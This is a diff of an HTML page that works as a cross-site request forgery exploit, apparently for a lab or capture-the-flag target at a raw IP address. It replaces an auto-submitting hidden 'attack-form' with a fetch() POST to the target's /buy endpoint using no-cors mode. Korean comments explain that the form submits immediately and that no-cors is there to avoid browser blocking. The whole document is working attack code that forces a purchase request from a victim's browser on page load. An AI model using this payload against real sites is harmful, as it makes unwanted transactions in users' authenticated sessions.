@@ -3,12 +3,18 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <form id="attack-form" action="http://15.164.98.47:32689/buy" method="POST">
-        <input type="hidden" name="product_id" value="5">
-    </form>
     <script>
-        // 폼을 즉시 제출합니다.
-        document.getElementById('attack-form').submit();
+        // 폼 대신 fetch를 사용하여 더 세밀하게 요청을 보낼 수 있습니다.
+        fetch('http://15.164.98.47:32689/buy', {
+            method: 'POST',
+            mode: 'no-cors', // 브라우저 차단을 피하기 위한 설정
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: 'product_id=5'
+        }).then(() => {
+            console.log('Request sent');
+        });
     </script>
 </body>
 </html>
